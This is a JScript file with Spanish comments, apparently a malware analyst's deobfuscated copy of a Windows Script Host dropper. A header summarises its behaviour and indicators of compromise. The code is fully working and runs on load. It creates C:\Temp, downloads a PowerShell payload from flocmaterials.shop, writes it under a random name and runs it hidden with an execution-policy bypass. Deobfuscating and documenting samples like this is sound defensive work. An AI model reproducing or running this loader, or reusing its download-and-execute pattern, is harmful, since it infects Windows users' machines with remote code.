/**
 * ============================================================================
 *  LOADER JAVASCRIPT — VERSIÓN DESOFUSCADA Y RENOMBRADA
 * ============================================================================
 *  Original:  8f963e4f2130940ad1bbf39f21ac0317269ff1cfa42a71af042120e91f49facb.js
 *  Tipo:      Malware "loader" / dropper (JScript para Windows)
 *  Vector:    Se ejecuta vía Windows Script Host (wscript.exe / cscript.exe),
 *             es decir, la extensión .js corre con WSH y tiene acceso a
 *             ActiveXObject (WScript.Shell, FileSystemObject, XMLHTTP).
 *
 *  COMPORTAMIENTO (resumen):
 *    1. Crea el directorio  C:\Temp\  si no existe.
 *    2. Descarga  https://flocmaterials.shop/nzeceo//secured_stub.ps1
 *       mediante MSXML2.XMLHTTP (hasta 2 reintentos).
 *    3. Guarda el payload con un nombre aleatorio:  C:\Temp\<8 chars>.ps1
 *    4. Lo ejecuta con:  powershell.exe -nop -ep bypass -file "..."
 *       (ventana oculta, esperando a que termine).
 *    5. Expone un objeto "ScriptAPI" con métodos run() / config() / reset()
 *       y lanza run() automáticamente al cargarse.
 *
 *  IOC principales:
 *    - URL:     https://flocmaterials.shop/nzeceo//secured_stub.ps1
 *    - C2/URL:  flocmaterials.shop
 *    - Comando: powershell.exe -nop -ep bypass -file
 *    - Objeto expuesto: ScriptAPI
 *    - Claves de configuración: address / directory / maxAttempts
 * ============================================================================
 */

(function () {
    'use strict';

    // -------------------------------------------------------------------------
    // Configuración por defecto del loader
    // -------------------------------------------------------------------------
    var config = {
        address:     'https://flocmaterials.shop/nzeceo//secured_stub.ps1', // URL del payload PowerShell
        directory:   'C:\\Temp\\',                                          // Carpeta de descarga
        maxAttempts: 2                                                       // Reintentos de descarga
    };

    // -------------------------------------------------------------------------
    // Objetos COM de Windows (solo disponibles bajo Windows Script Host)
    // -------------------------------------------------------------------------
    var fileSystem = new ActiveXObject('Scripting.FileSystemObject'); // I/O de archivos y carpetas
    var shell      = new ActiveXObject('WScript.Shell');              // Ejecución de comandos
    var http       = new ActiveXObject('MSXML2.XMLHTTP');             // Peticiones HTTP

    /**
     * Asegura que una carpeta exista, creándola si es necesario.
     * @param {string} folderPath Ruta de la carpeta.
     * @returns {boolean} true si la carpeta existe (o se creó) correctamente.
     */
    function ensureFolderExists(folderPath) {
        try {
            if (!fileSystem.FolderExists(folderPath)) {
                fileSystem.CreateFolder(folderPath);
            }
            return true;
        } catch (error) {
            return false;
        }
    }

    /**
     * Genera un nombre de archivo aleatorio con extensión .ps1.
     * Equivalente a:  Math.random().toString(36).substring(2, 10).toUpperCase() + ".ps1"
     * @returns {string} Nombre tipo "AB12CD34.ps1".
     */
    function generateRandomFileName() {
        var randomPart = Math.random().toString(36).substring(2, 10);
        return randomPart.toUpperCase() + '.ps1';
    }

    /**
     * Escribe contenido a un archivo (creándolo o sobrescribiéndolo).
     * @param {string} filePath Ruta completa del archivo destino.
     * @param {string} content  Contenido a escribir.
     */
    function writeFile(filePath, content) {
        var stream = fileSystem.CreateTextFile(filePath, true); // true = sobrescribir
        stream.Write(content);
        stream.Close();
    }

    /**
     * Descarga un recurso por HTTP de forma síncrona con reintentos.
     * @param {string} url          URL del recurso.
     * @param {number} maxAttempts  Número máximo de intentos.
     * @returns {string|null} Cuerpo de la respuesta (responseText) o null si falla.
     */
    function downloadFile(url, maxAttempts) {
        maxAttempts = maxAttempts || 2;
        var responseText = null;

        for (var attempt = 0; attempt <= maxAttempts; attempt++) {
            try {
                http.open('GET', url, false);  // false = petición síncrona
                http.send();

                if (http.status === 200) {     // 0xC8 = HTTP 200 OK
                    responseText = http.responseText;
                    break;
                }
            } catch (error) {
                // Silencia el error y reintenta en la siguiente iteración.
            }
        }

        return responseText;
    }

    /**
     * Guarda el payload en disco y lo ejecuta con PowerShell (oculto).
     * @param {string} content   Contenido del script PowerShell.
     * @param {string} directory Carpeta donde guardarlo.
     * @returns {boolean} true si la ejecución se lanzó correctamente.
     */
    function saveAndExecute(content, directory) {
        var fileName = generateRandomFileName();          // <aleatorio>.ps1
        var fullPath = directory + fileName;              // C:\Temp\<aleatorio>.ps1
        var success  = false;

        try {
            writeFile(fullPath, content);

            var command =
                'powershell.exe -nop -ep bypass -file "' + fullPath + '"';

            // Run(comando, estiloVentana=0 (oculto), esperarTerminacion=true)
            shell.Run(command, 0, true);

            success = true;
        } catch (error) {
            success = false;
        }

        return success;
    }

    /**
     * Flujo principal del loader: carpeta -> descarga -> guarda y ejecuta.
     * @returns {boolean} true si todo el pipeline se completó.
     */
    function run() {
        // 1) Preparar carpeta de descarga
        var folderReady = ensureFolderExists(config.directory);
        if (!folderReady) {
            return false;
        }

        // 2) Descargar el payload
        var payload = downloadFile(config.address, config.maxAttempts);
        if (!payload) {
            return false;
        }

        // 3) Guardar y ejecutar el payload
        return saveAndExecute(payload, config.directory);
    }

    /**
     * Getter/setter de la configuración.
     *   config('address')          -> devuelve el valor
     *   config('address', '...')   -> lo cambia y devuelve el objeto (encadenable)
     */
    function configApi(key, value) {
        if (value !== undefined) {
            config[key] = value;
            return api;
        }
        return config[key];
    }

    /**
     * Restaura la configuración a sus valores por defecto.
     */
    function reset() {
        config = {
            address:     'https://flocmaterials.shop/nzeceo//secured_stub.ps1',
            directory:   'C:\\Temp\\',
            maxAttempts: 2
        };
        return api;
    }

    // -------------------------------------------------------------------------
    // API pública expuesta por el loader como "ScriptAPI"
    // -------------------------------------------------------------------------
    var api = {
        run:    run,
        config: configApi,
        reset:  reset
    };

    // Ejecución automática al cargar el script
    api.run();

    // Exponer el objeto en el ámbito global de WSH
    this['ScriptAPI'] = api;
})();
